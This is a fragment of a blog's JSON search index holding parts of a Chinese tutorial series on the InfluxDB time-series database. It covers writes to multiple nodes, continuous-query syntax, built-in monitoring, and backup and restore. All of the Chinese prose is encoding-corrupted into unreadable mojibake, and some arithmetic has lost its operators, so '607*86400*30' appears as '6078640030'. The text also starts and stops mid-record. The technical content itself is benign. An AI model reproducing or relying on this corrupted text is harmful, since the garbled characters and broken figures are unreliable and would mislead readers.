æ—¢ç„¶æœ‰å•ç‚¹æ•…éšœçš„å¯èƒ½ï¼Œé‚£ä¹ˆç´¢æ€§å†™å…¥å¤šä¸ªèŠ‚ç‚¹ï¼ŒåŒæ—¶ä¹Ÿè§£å†³äº†å®¹ç¾å¤‡ä»½çš„é—®é¢˜ï¼š 1ã€åœ¨ä¸åŒçš„æœºå™¨ä¸Šé…ç½®å¤šä¸ª InfluxDB å®ä¾‹ï¼Œå†™å…¥æ•°æ®æ—¶ï¼Œç›´æ¥ç”±å®¢æˆ·ç«¯å¹¶å‘å†™å…¥å¤šä¸ªå®ä¾‹ã€‚ï¼ˆä¸ºä»€ä¹ˆä¸ç”¨ä»£ç†ï¼Œå› ä¸ºä»£ç†è‡ªèº«å°±æ˜¯ä¸ªå•ç‚¹ï¼‰ã€‚ 2ã€å½“æŸä¸ª InfluxDB å®ä¾‹æ•…éšœè€Œå¯¼è‡´å†™å…¥å¤±è´¥æ—¶ï¼Œè®°å½•å¤±è´¥çš„æ•°æ®å’ŒèŠ‚ç‚¹ï¼Œè¿™äº›å¤±è´¥çš„æ•°æ®å¯ä»¥ä¸´æ—¶å­˜å‚¨åœ¨æ•°æ®åº“ã€æ¶ˆæ¯ä¸­é—´ä»¶ã€æ—¥å¿—æ–‡ä»¶ç­‰ç­‰é‡Œé¢ã€‚ 3ã€é€šè¿‡è‡ªå®šä¹‰çš„ worker æ‹‰å–ä¸Šä¸€æ­¥è®°å½•çš„å¤±è´¥çš„æ•°æ®ç„¶åé‡å†™è¿™äº›æ•°æ®ã€‚ 4ã€å¤šä¸ª InfluxDB ä¸­çš„æ•°æ®æœ€ç»ˆä¸€è‡´ã€‚ å½“ç„¶ä½ éœ€è¦æ³¨æ„çš„æ˜¯ï¼š 1ã€ç”±äºæ˜¯å¹¶å‘å†™å…¥å¤šä¸ªèŠ‚ç‚¹ï¼Œä¸”ä¸åŒæœºå™¨çš„çŠ¶å†µä¸ä¸€ï¼Œæ‰€ä»¥å†™å…¥æ•°æ®åº”è¯¥è®¾ç½®ä¸€ä¸ªè¶…æ—¶æ—¶é—´ã€‚ 2ã€å†™å…¥å¤±è´¥çš„æ•°æ®å¿…é¡»è¦ä¸èŠ‚ç‚¹ç›¸å¯¹åº”ï¼ŒåŒæ—¶ä½ åº”è¯¥è€ƒè™‘å¦‚ä½•å»å®šä¹‰å¤±è´¥çš„æ•°æ®ï¼šç”±äºæ ¼å¼ä¸æ­£ç¡®æˆ–è€…æƒé™é—®é¢˜å¯¼è‡´çš„ 4xx æˆ–è€… InfluxDB æœ¬èº«å¼‚å¸¸å¯¼è‡´çš„ 5xx ï¼Œè¿™äº›ä¸ InfluxDB å®•æœºç­‰æ•…éšœå¯¼è‡´çš„å¤±è´¥æ˜¾ç„¶æ˜¯ä¸åŒçš„ã€‚ 3ã€ç”±äºå¤±è´¥çš„æ•°æ®éœ€è¦ä¸´æ—¶å­˜å‚¨åœ¨ä¸€ä¸ªæ•°æ®å®¹å™¨ä¸­ï¼Œä½ åº”è¯¥è€ƒè™‘æ‰€ä½¿ç”¨çš„æ•°æ®å®¹å™¨èƒ½å¦æ‰¿è½½æ•…éšœæœŸé—´å†™å…¥çš„æ•°æ®å‹åŠ›ï¼Œä»¥åŠå¦‚æœæ•°æ®è¦æ±‚ä¸å¯ä¸¢å¤±ï¼Œé‚£ä¹ˆæ•°æ®å®¹å™¨ä¹Ÿéœ€è¦æœ‰å¯¹åº”çš„æ”¯æŒã€‚ 4ã€å¤±è´¥æ•°æ®çš„é‡å†™æ˜¯ä¸€ä¸ªå¼‚æ­¥çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥å†™å…¥çš„æ•°æ®åº”è¯¥ç”±å®¢æˆ·ç«¯æŒ‡å®šæ˜ç¡®çš„æ—¶é—´æˆ³ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ InfluxDB å†™å…¥æ—¶é»˜è®¤ç”Ÿæˆçš„æ—¶é—´æˆ³ã€‚ 5ã€æ•…éšœæœŸé—´å¤šä¸ª InfluxDB å¯èƒ½å­˜åœ¨æ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µã€‚ ç›¸å…³æ–‡ç« ï¼š æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸€ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäºŒï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸‰ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå››ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäº”ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå…­ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸ƒï¼‰ ","date":"2019-11-17","objectID":"/7/:0:0","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸ƒï¼‰","uri":"/7/"},{"categories":["InfluxDB"],"content":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå…­ï¼‰","date":"2019-11-06","objectID":"/6/","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå…­ï¼‰","uri":"/6/"},{"categories":["InfluxDB"],"content":" CQ è¿ç»­æŸ¥è¯¢ è¿ç»­æŸ¥è¯¢ Continuous Queriesï¼ˆ CQ ï¼‰æ˜¯ InfluxDB å¾ˆé‡è¦çš„ä¸€é¡¹åŠŸèƒ½ï¼Œå®ƒçš„ä½œç”¨æ˜¯åœ¨ InfluxDB æ•°æ®åº“å†…éƒ¨è‡ªåŠ¨å®šæœŸçš„æ‰§è¡ŒæŸ¥è¯¢ï¼Œç„¶åå°†æŸ¥è¯¢ç»“æœå­˜å‚¨åˆ°æŒ‡å®šçš„ measurement é‡Œã€‚ é…ç½®æ–‡ä»¶ä¸­çš„ç›¸å…³é…ç½®ï¼š [continuous_queries] enabled = true log-enabled = true query-stats-enabled = false run-interval = \"1s\" enabled = true ï¼šå¼€å¯CQ log-enabled = true ï¼šè¾“å‡º CQ æ—¥å¿— query-stats-enabled = false ï¼šå…³é—­ CQ æ‰§è¡Œç›¸å…³çš„ç›‘æ§ï¼Œä¸ä¼šå°†ç»Ÿè®¡æ•°æ®å†™å…¥é»˜è®¤çš„ç›‘æ§æ•°æ®åº“ _internal run-interval = â€œ1sâ€ ï¼šInfluxDB æ¯éš” 1s æ£€æŸ¥æ˜¯å¦æœ‰ CQ éœ€è¦æ‰§è¡Œ åŸºæœ¬è¯­æ³• ä¸€ ã€ åŸºæœ¬è¯­æ³•ï¼š CREATE CONTINUOUS QUERY \u003ccq_name\u003e ON \u003cdatabase_name\u003e BEGIN \u003ccq_query\u003e END åœ¨æŸä¸ªæ•°æ®åº“ä¸Šåˆ›å»ºä¸€ä¸ª CQ ï¼Œè€ŒæŸ¥è¯¢çš„å…·ä½“å†…å®¹ cq_query çš„è¯­æ³•ä¸ºï¼š SELECT \u003cfunction[s]\u003e INTO \u003cdestination_measurement\u003e FROM \u003cmeasurement\u003e [WHERE \u003cstuff\u003e] GROUP BY time(\u003cinterval\u003e)[,\u003ctag_key[s]\u003e] SELECT function[s] : è¿ç»­æŸ¥è¯¢å¹¶ä¸åªæ˜¯ç®€å•çš„æŸ¥è¯¢åŸå§‹æ•°æ®ï¼Œè€Œæ˜¯åŸºäºåŸå§‹æ•°æ®è¿›è¡Œèšåˆã€ç‰¹é€‰ã€è½¬æ¢ã€é¢„æµ‹ç­‰å¤„ç†ï¼Œæ‰€ä»¥ CQ å¿…é¡»è¦æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®å¤„ç†å‡½æ•°ã€‚ INTO \u003cdestination_measurement\u003e : å°† CQ çš„ç»“æœå­˜å‚¨åˆ°æŒ‡å®šçš„ measurement ä¸­ã€‚ FROM : åŸå§‹æ•°æ®çš„æ¥æº measurement ã€‚ [WHERE ] : å¯é€‰é¡¹ï¼ŒåŸå§‹æ•°æ®çš„ç­›é€‰æ¡ä»¶ã€‚ GROUP BY time()[,\u003ctag_key[s]\u003e] : è¿ç»­æŸ¥è¯¢ä¸æ˜¯æŸ¥ä¸€æ¬¡å°±å®Œäº†ï¼Œè€Œæ˜¯æ¯æ¬¡æŸ¥è¯¢æŒ‡å®šæ—¶é—´èŒƒå›´å†…çš„æ•°æ®ï¼Œä¸æ–­å‘¨æœŸæ€§çš„æ‰§è¡Œä¸‹å»ã€‚ å®šä½ä¸€ä¸ª measurement çš„å®Œæ•´æ ¼å¼æ˜¯ï¼š \u003cdatabase\u003e.\u003cRP\u003e.\u003cmeasurement\u003e ä½¿ç”¨å½“å‰æ•°æ®åº“å’Œé»˜è®¤ RP çš„æƒ…å†µå°±åªéœ€è¦ measurement ã€‚ InfluxDB æ”¯æŒçš„æ—¶é•¿å•ä½ï¼š ns : çº³ç§’ u / Âµ : å¾®ç§’ ms : æ¯«ç§’ s : ç§’ m : åˆ†é’Ÿ h : å°æ—¶ d : å¤© w : å‘¨ äºŒã€ 1ã€CQ åœ¨ä½•æ—¶æ‰§è¡Œï¼Ÿ CQ åœ¨ä½•æ—¶æ‰§è¡Œå–å†³äº CQ åˆ›å»ºå®Œæˆçš„æ—¶é—´ç‚¹ã€GROUP BY time() è®¾ç½®çš„æ—¶é—´é—´éš”ã€ä»¥åŠ InfluxDB æ•°æ®åº“é¢„è®¾çš„æ—¶é—´è¾¹ç•Œï¼ˆè¿™ä¸ªé¢„è®¾çš„æ—¶é—´è¾¹ç•Œå…¶å®å°±æ˜¯ 1970.01.01 00:00:00 UTC æ—¶é—´ï¼Œå¯¹åº” Unix timestamp çš„ 0 å€¼ï¼‰ã€‚ å‡è®¾æˆ‘åœ¨ 2019.11.05ï¼ˆåŒ—äº¬æ—¶é—´ï¼‰åˆ›å»ºå¥½äº†ä¸€ä¸ª GROUP BY time(30d) çš„ CQï¼ˆä¹Ÿå°±æ˜¯æ—¶é—´é—´éš”ä¸º 30 å¤©ï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ª CQ ä¼šåœ¨ä»€ä¹ˆæ—¶é—´ç‚¹æ‰§è¡Œï¼Ÿ é¦–å…ˆï¼Œ2019.11.05 å·è½¬æ¢ä¸º timestamp æ˜¯ 1572883200 ç§’ï¼› å†ç®—1572883200 è·ç¦» 0 å€¼éš”äº†å¤šå°‘ä¸ª 30 å¤©ï¼ˆä¸€å¤©æ˜¯ 86400 ç§’ï¼‰ï¼Œ1572883200/86400/30 = 606.8 ï¼› é‚£ä¹ˆä¸‹ä¸€ä¸ª 30 å¤©å°±æ˜¯ 606.8 å‘ä¸Šå–æ•´ 607 ï¼Œ6078640030 = 1573344000 ï¼Œè½¬æ¢ä¸ºå¯¹åº”çš„æ—¥æœŸå°±æ˜¯ 2019.11.10 å·ï¼Œè¿™ä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¬¡æ‰§è¡Œ CQ çš„æ—¶é—´ï¼Œä¹‹åæ¯æ¬¡æ‰§è¡Œå°±æ˜¯å¾€åæ¨ 30 å¤©ã€‚ å¦‚æœæ¯æ¬¡éƒ½è¿™æ ·ç®—å°±å¾ˆéº»çƒ¦ï¼Œä½†å…¶å®æˆ‘ä»¬æ›´å¸¸ä½¿ç”¨çš„æ—¶é—´é—´éš”æ²¡æœ‰é‚£ä¹ˆé•¿ï¼Œé€šå¸¸éƒ½æ˜¯ç§’ã€åˆ†é’Ÿã€å°æ—¶å•ä½ï¼Œè¿™ç§æƒ…å†µä¸‹ç›´æ¥ä» 0 é€Ÿç®—å°±å¯ä»¥äº†ï¼Œæ¯”å¦‚ï¼š åœ¨æ—¶é—´ç‚¹ 16:09:35 åˆ›å»ºäº† CQ ï¼ŒGROUP BY time(30s) ï¼Œé‚£ä¹ˆ CQ çš„æ‰§è¡Œæ—¶é—´å°±æ˜¯ 16:10:00ã€16:10:30ã€16:11:00 ä»¥æ­¤ç±»æ¨ï¼ˆä» 0s å¼€å§‹é€Ÿç®—ï¼‰ã€‚ åœ¨æ—¶é—´ç‚¹ 16:16:08 åˆ›å»ºäº† CQ ï¼ŒGROUP BY time(5m) ï¼Œé‚£ä¹ˆ CQ çš„æ‰§è¡Œæ—¶é—´å°±æ˜¯ 16:20:00ã€16:25:00ã€16:30:00 ä»¥æ­¤ç±»æ¨ï¼ˆä» 0m å¼€å§‹é€Ÿç®—ï¼‰ã€‚ åœ¨æ—¶é—´ç‚¹ 16:38:27 åˆ›å»ºäº† CQ ï¼ŒGROUP BY time(2h) ï¼Œé‚£ä¹ˆ CQ çš„æ‰§è¡Œæ—¶é—´å°±æ˜¯ 18:00:00 ã€20:00:00 ã€22:00:00 ä»¥æ­¤ç±»æ¨ï¼ˆä» 0h å¼€å§‹é€Ÿç®—ï¼‰ã€‚ 2ã€CQ æ‰§è¡Œçš„æ•°æ®èŒƒå›´ï¼Ÿ è¿ç»­æŸ¥è¯¢ä¼šæ ¹æ® GROUP BY time() çš„æ—¶é—´é—´éš”ç¡®å®šä½œç”¨çš„æ•°æ®ï¼Œæ¯æ¬¡æ‰§è¡Œæ‰€é’ˆå¯¹çš„æ•°æ®çš„æ—¶é—´èŒƒå›´æ˜¯ [ now() - GROUP BY time() ï¼Œnow() ) ã€‚ ä¾‹å¦‚ï¼ŒGROUP BY time(1h) ï¼š åœ¨ 8:00 æ‰§è¡Œæ—¶ï¼Œæ•°æ®æ˜¯æ—¶é—´å¤§äºç­‰äº 7:00ï¼Œå°äº 8:00ï¼Œå³ [ 7:00 , 8:00 ) èŒƒå›´å†…çš„æ•°æ®ã€‚ åœ¨ 9:00 æ‰§è¡Œæ—¶ï¼Œæ•°æ®æ˜¯æ—¶é—´å¤§äºç­‰äº 8:00ï¼Œå°äº 9:00ï¼Œå³ [ 8:00 , 9:00 ) èŒƒå›´å†…çš„æ•°æ®ã€‚ ä½ å¯ä»¥ä½¿ç”¨ WHERE å»è¿‡æ»¤æ•°æ®ï¼Œä½†æ˜¯ WHERE é‡ŒæŒ‡å®šçš„æ—¶é—´èŒƒå›´ä¼šè¢«å¿½ç•¥æ‰ã€‚ 3ã€CQ çš„æ‰§è¡Œç»“æœï¼Ÿ CQ ä¼šå°†æ‰§è¡Œç»“æœå­˜å‚¨åˆ°æŒ‡å®šçš„ measurement ï¼Œä½†æ˜¯å­˜å‚¨çš„å…·ä½“å­—æ®µæœ‰å“ªäº›å‘¢ï¼Ÿé¦–å…ˆ time æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œtime å†™å…¥çš„æ˜¯ CQ æ‰§è¡Œæ—¶æ•°æ®èŒƒå›´çš„å¼€å§‹æ—¶é—´ç‚¹ï¼›å…¶æ¬¡å°±æ˜¯ function çš„å¤„ç†ç»“æœï¼Œå¦‚æœåªæœ‰å•ä¸€å­—æ®µï¼Œé‚£ä¹ˆ field key å°±æ˜¯ function çš„åç§°ï¼Œå¦‚æœæœ‰å¤šä¸ªå­—æ®µï¼Œé‚£ä¹ˆ field key å°±æ˜¯ function åç§°_ä½œç”¨å­—æ®µã€‚ ä¾‹å¦‚ï¼ŒGROUP BY time(30m) ï¼ŒUTC 7:30 æ‰§è¡Œï¼š å•ä¸€å­—æ®µï¼š SELECT mean(\"field\") INTO \"result_measurement\" FROM \"source_measurement\" GROUP BY time(30m) CQ ç»“æœï¼š time mean 2019-11-05T07:00:00Z 7 å¤šå­—æ®µï¼š SELECT mean(\"*\") INTO \"result_measurement\" FROM \"source_measurement\" GROUP BY time(30m) CQ ç»“æœï¼š time mean_field1 mean_field2 2019-11-05T07:00:00Z 7 6.5 è¿™é‡Œçš„ mean å¯¹åº”çš„æ˜¯ function é‡Œçš„å¹³å‡å€¼å‡½æ•°ã€‚ ä¸‰ã€ GROUP BY time() çš„å®Œæ•´æ ¼å¼æ˜¯ï¼š GROUP BY time(\u003cinterval\u003e[,\u003coffset_interval\u003e]) ç¬¬äºŒä¸ªå‚æ•° offset_interval åç§»é‡æ˜¯å¯é€‰çš„ï¼Œè¿™ä¸ªåç§»é‡ä¼šå¯¹ CQ çš„æ‰§è¡Œæ—¶é—´å’Œæ•°æ®èŒƒå›´äº§ç”Ÿå½±å“ã€‚ å¦‚æœ GROUP BY time(1h) ï¼Œåœ¨ 8:00 æ‰§è¡Œï¼Œæ•°æ®èŒƒå›´æ˜¯ [ 7:00 , 8:00 ) ã€‚ é‚£ä¹ˆ GROUP BY time(1h, 15m) ä¼šä½¿ CQ çš„æ‰§è¡Œæ—¶é—´å‘åæ¨è¿Ÿ 15m ï¼Œå³åœ¨ 8:15 æ‰§è¡Œï¼Œæ•°æ®èŒƒå›´ä¹Ÿå°±å˜æˆäº† [ 7:15 , 8:15 ) ã€‚ é«˜çº§è¯­æ³• é«˜çº§è¯­æ³•ï¼š CREATE CONTINUOUS QUERY \u003ccq_name\u003e ON \u003cdatabase_name\u003e RESAMPLE EVERY \u003cinterval\u003e FOR \u003cinterval\u003e BEGIN \u003ccq_query\u003e END ä¸åŸºæœ¬è¯­æ³•ä¸åŒçš„æ˜¯ï¼Œé«˜çº§è¯­æ³•å¤šäº† RESAMPLE EVERY \u003cinterval\u003e FOR \u003cinterval\u003e 1ã€RESAMPLE EVERY EVERY å®šä¹‰äº† CQ æ‰§è¡Œçš„é—´éš”ï¼š RESAMPLE EVERY 30m æ„æ€å°±æ˜¯æ¯éš” 30m æ‰§è¡Œä¸€æ¬¡ CQ ã€‚ ç¤ºä¾‹ï¼š CREATE CONTINUOUS QUERY \"cq_every\" ON \"db\" RESAMPLE EVERY 30m BEGIN SELECT mean(\"field\") INTO \"result_measurement\" FROM \"source_measurement\" GROUP BY time(1h) END å¦‚æœæ²¡æœ‰ RESAMPLE EVERY 30m ï¼Œåªæœ‰ GROUP BY time(1h) å°†ä¼šï¼š åœ¨ 8:00 æ‰§è¡Œ CQ ï¼Œæ•°æ®èŒƒå›´æ˜¯ [ 7:00 , 8:00 ) åœ¨ 9:00 æ‰§è¡Œ CQ ï¼Œæ•°æ®èŒƒå›´æ˜¯ [ 8:00 , 9:00 ) å¢åŠ äº† RESAMPLE EVERY 30m ä¹‹åï¼Œæ¯ 30m æ‰§è¡Œä¸€æ¬¡ CQ ï¼š åœ¨ 8:00 æ‰§è¡Œ CQ ï¼Œæ•°æ®èŒƒå›´æ˜¯ [ 7:00 , 8:00 ) åœ¨ 8:30 æ‰§è¡Œ CQ ï¼Œæ•°æ®èŒƒå›´æ˜¯ [ 8:00 , 9:00 ) åœ¨ 9:00 æ‰§è¡Œ CQ ï¼Œæ•°æ®èŒƒå›´æ˜¯ [ 8:00 , 9:00 ) ï¼Œç”±äºæ‰§è¡Œç»“æœçš„ time å­—æ®µæ˜¯ 8:00 ä¸ä¸Šä¸€æ¬¡ CQ ä¸€è‡´ï¼Œå› æ­¤ä¼šè¦†ç›–ä¸Šä¸€æ¬¡ CQ çš„ç»“æœã€‚ å½“ EVERY çš„æ—¶é—´é—´éš”å°äº GROUP BY time() æ—¶ï¼Œä¼šå¢åŠ  CQ çš„æ‰§è¡Œé¢‘ç‡ï¼ˆå¦‚ä¸Šè¿°ç¤ºä¾‹ï¼‰ã€‚ å½“ EVERY ä¸ GROUP BY time() çš„æ—¶é—´é—´éš”ä¸€è‡´æ—¶ï¼Œæ— å½±å“ã€‚ å½“ EVERY çš„æ—¶é—´é—´éš”å¤§äº GROUP BY time() æ—¶ï¼ŒCQ æ‰§è¡Œæ—¶é—´å’Œæ•°æ®èŒƒå›´å®Œå…¨ç”± EVERY æ§åˆ¶ï¼Œä¾‹å¦‚ EVERY 30m ï¼ŒGROUP BY tim","date":"2019-11-06","objectID":"/6/:0:0","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå…­ï¼‰","uri":"/6/"},{"categories":["InfluxDB"],"content":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäº”ï¼‰","date":"2019-10-30","objectID":"/5/","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäº”ï¼‰","uri":"/5/"},{"categories":["InfluxDB"],"content":" ç³»ç»Ÿç›‘æ§ InfluxDB è‡ªå¸¦æœ‰ä¸€ä¸ªç›‘æ§ç³»ç»Ÿï¼Œé»˜è®¤æƒ…å†µä¸‹æ­¤åŠŸèƒ½æ˜¯å¼€å¯çš„ï¼Œæ¯éš” 10 ç§’ä¸­é‡‡é›†ä¸€æ¬¡ç³»ç»Ÿæ•°æ®å¹¶æŠŠæ•°æ®å†™å…¥åˆ° _internal æ•°æ®åº“ä¸­ï¼Œå…¶é»˜è®¤ä½¿ç”¨åç§°ä¸º monitor çš„ RPï¼ˆæ•°æ®ä¿ç•™ 7 å¤©ï¼‰ï¼Œç›¸å…³é…ç½®è§é…ç½®æ–‡ä»¶ä¸­çš„ï¼š [monitor] store-enabled = true store-database = \"_internal\" store-interval = \"10s\" _internal æ•°æ®åº“ä¸å…¶å®ƒæ•°æ®åº“çš„ä½¿ç”¨æ–¹å¼å®Œå…¨ä¸€è‡´ï¼Œå…¶è®°å½•çš„ç»Ÿè®¡æ•°æ®åˆ†ä¸ºå¤šä¸ª measurements ï¼š cq ï¼šè¿ç»­æŸ¥è¯¢ database ï¼šæ•°æ®åº“ httpd ï¼šHTTP ç›¸å…³ queryExecutor ï¼šæŸ¥è¯¢æ‰§è¡Œå™¨ runtime ï¼šè¿è¡Œæ—¶ shard ï¼šåˆ†ç‰‡ subscriber ï¼šè®¢é˜…è€… tsm1_cache ï¼šTSM cache ç¼“å­˜ tsm1_engine ï¼šTSM å¼•æ“ tsm1_filestore ï¼šTSM filestore tsm1_wal ï¼šTSM é¢„å†™æ—¥å¿— write ï¼šæ•°æ®å†™å…¥ æ¯”å¦‚æŸ¥è¯¢æœ€è¿‘ä¸€æ¬¡ç»Ÿè®¡çš„æ•°æ®å†™å…¥æƒ…å†µï¼š select * from \"write\" order by time desc limit 1 _internal æ•°æ®åº“é‡Œçš„è¿™äº› measurements ä¸­å…·ä½“æœ‰å“ªäº› field ï¼Œæ¯ä¸ª field æ•°æ®åˆä»£è¡¨äº†ä»€ä¹ˆå«ä¹‰ï¼Œè¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼š https://docs.influxdata.com/platform/monitoring/influxdata-platform/tools/measurements-internal/#influxdb-internal-measurements-and-fields InfluxDB ç›¸å…³å‘½ä»¤ï¼š show stats show diagnostics 1ã€ SHOW STATS [ FOR '\u003ccomponent\u003e' | 'indexes' ] show stats å‘½ä»¤è¿”å›çš„ç³»ç»Ÿæ•°æ®ä¸ _internal æ•°æ®åº“ä¸­çš„æ•°æ®ç»“æ„æ˜¯ä¸€è‡´çš„ï¼Œè¿™é‡Œçš„ component å…¶å®å°±æ˜¯å¯¹åº” _internal ä¸­çš„ measurement ï¼Œæ¯”å¦‚ï¼š show stats for 'queryExecutor' å”¯ä¸€ä¾‹å¤–çš„æ˜¯ï¼š show stats for 'indexes' å…¶ä¼šè¿”å›æ‰€æœ‰ç´¢å¼•ä½¿ç”¨çš„å†…å­˜å¤§å°é¢„ä¼°å€¼ï¼Œä¸”æ²¡æœ‰ _internal ä¸­çš„ measurement ä¸ä¹‹å¯¹åº”ã€‚ 2ã€ SHOW DIAGNOSTIC è¿”å›ç³»ç»Ÿçš„è¯Šæ–­ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼šç‰ˆæœ¬ä¿¡æ¯ã€æ­£å¸¸è¿è¡Œæ—¶é—´ã€ä¸»æœºåã€æœåŠ¡å™¨é…ç½®ã€å†…å­˜ä½¿ç”¨æƒ…å†µã€Go è¿è¡Œæ—¶ç­‰ï¼Œè¿™äº›æ•°æ®ä¸ä¼šå­˜å‚¨åˆ° _internal æ•°æ®åº“ä¸­ã€‚ InfluxDB ä¹Ÿæ”¯æŒé€šè¿‡ HTTP æ¥å£è·å–ç³»ç»Ÿä¿¡æ¯ï¼š /metrics ï¼šè¿™ä¸ªæ¥å£è¿”å›çš„æ•°æ®æ˜¯è¯¸å¦‚åƒåœ¾å›æ”¶ã€å†…å­˜åˆ†é…ç­‰çš„ Go ç›¸å…³æŒ‡æ ‡ã€‚ /debug/vars ï¼šè¿™ä¸ªæ¥å£è¿”å›çš„æ•°æ®ä¸ _internal æ•°æ®ç±»ä¼¼ã€‚ å¤‡ä»½å’Œæ¢å¤ InfluxDB æ”¯æŒæœ¬åœ°æˆ–è¿œç¨‹çš„æ•°æ®å¤‡ä»½å’Œæ¢å¤ï¼Œå…¶æ˜¯é€šè¿‡ TCP è¿æ¥è¿›è¡Œçš„ï¼Œå¯¹äºè¿œç¨‹æ–¹å¼ï¼Œä½ å¿…é¡»ä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­çš„ï¼š bind-address = \"127.0.0.1:8088\" å°†å…¶è®¾ç½®ä¸ºæœ¬æœºåœ¨ç½‘ç»œä¸Šå¯é€šä¿¡çš„å¯¹å¤–åœ°å€ï¼Œç„¶åé‡å¯æœåŠ¡ï¼Œæ‰§è¡Œå‘½ä»¤æ—¶éœ€è¦é€šè¿‡ -host å‚æ•°å¯¹åº”è¿™ä¸ªåœ°å€ã€‚ å¤‡ä»½å‘½ä»¤ï¼š æ¢å¤å‘½ä»¤ï¼š å¤‡ä»½å’Œæ¢å¤çš„å‘½ä»¤å‚æ•°éå¸¸ç›¸ä¼¼ï¼Œå‚æ•°çš„å«ä¹‰ä¹Ÿæ˜¯ä¸€ç›®äº†ç„¶çš„ï¼Œæ¯”å¦‚ä½ å¯ä»¥å¤‡ä»½æŒ‡å®šçš„æ•°æ®åº“ã€RPã€shardï¼Œæ¢å¤åˆ°æ–°çš„æ•°æ®åº“ã€RP ã€‚ ç”±äºå¤‡ä»½çš„æ ¼å¼è¿›è¡Œè¿‡ä¸å…¼å®¹çš„æ›´æ–°ï¼Œ-portable å°±æ˜¯æŒ‡å®šä½¿ç”¨æ–°çš„å¤‡ä»½æ ¼å¼ï¼ˆå¼ºçƒˆå»ºè®®ä½¿ç”¨ï¼‰ï¼Œ-online å°±æ˜¯è€çš„å¤‡ä»½æ ¼å¼ã€‚ æ‰€æœ‰å¤‡ä»½éƒ½æ˜¯å…¨é‡å¤‡ä»½ï¼Œä¸æ”¯æŒå¢é‡å¤‡ä»½ã€‚ä½ å¯èƒ½ä¼šé—®ï¼Œä¸æ˜¯æœ‰ -start å’Œ -end å¯ä»¥æŒ‡å®šå¤‡ä»½æ•°æ®çš„æ—¶é—´èŒƒå›´å—ï¼Ÿæ²¡é”™ï¼Œæ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯å¤‡ä»½æ˜¯åœ¨æ•°æ®å—ä¸Šæ‰§è¡Œï¼Œå¹¶ä¸æ˜¯é€ç‚¹æ‰§è¡Œï¼Œè€Œæ•°æ®å—åˆæ˜¯é«˜åº¦å‹ç¼©çš„ï¼Œä½ ä½¿ç”¨ -start å’Œ -end æ—¶ï¼Œå…¶è¿˜ä¼šå¤‡ä»½åˆ°åŒä¸€ä¸ªæ•°æ®å—ä¸­çš„å…¶å®ƒæ•°æ®ç‚¹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š å¤‡ä»½å’Œè¿˜åŸå¯èƒ½ä¼šåŒ…å«æŒ‡å®šæ—¶é—´èŒƒå›´ä¹‹å¤–çš„æ•°æ®ã€‚ å¦‚æœåŒ…å«é‡å¤çš„æ•°æ®ç‚¹ï¼Œå†æ¬¡å†™å…¥åˆ™ä¼šè¦†ç›–ç°æœ‰æ•°æ®ç‚¹ã€‚ å¦å¤–ï¼Œæ¢å¤æ•°æ®æ—¶ï¼Œæ— æ³•ç›´æ¥æ¢å¤åˆ°ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ•°æ®åº“æˆ–è€… RP ä¸­ï¼Œä¸ºæ­¤ä½ åªèƒ½å…ˆä½¿ç”¨ä¸€ä¸ªä¸´æ—¶çš„æ•°æ®åº“å’Œ RP ï¼Œç„¶åå†é‡æ–°å°†æ•°æ®æ’å…¥åˆ°å·²æœ‰çš„æ•°æ®åº“ä¸­ï¼ˆæ¯”å¦‚ä½¿ç”¨ select â€¦ into è¯­å¥ï¼‰ã€‚ ç›¸å…³æ–‡ç« ï¼š æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸€ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäºŒï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸‰ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå››ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäº”ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå…­ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸ƒï¼‰ ","date":"2019-10-30","objectID":"/5/:0:0","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäº”ï¼‰","uri":"/5/"},{"categories":["InfluxDB"],"content":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå››ï¼‰","date":"2019-10-28","objectID":"/4/","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå››ï¼‰","uri":"/4/"},{"categories":["InfluxDB"],"content":" å­˜å‚¨å¼•æ“ InfluxDB æ•°æ®çš„å†™å…¥å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ‰€æœ‰æ•°æ®å…ˆå†™å…¥åˆ° WALï¼ˆ Write Ahead Log ï¼‰é¢„å†™æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶åŒæ­¥åˆ° Cache ç¼“å­˜ä¸­ï¼Œå½“ Cache 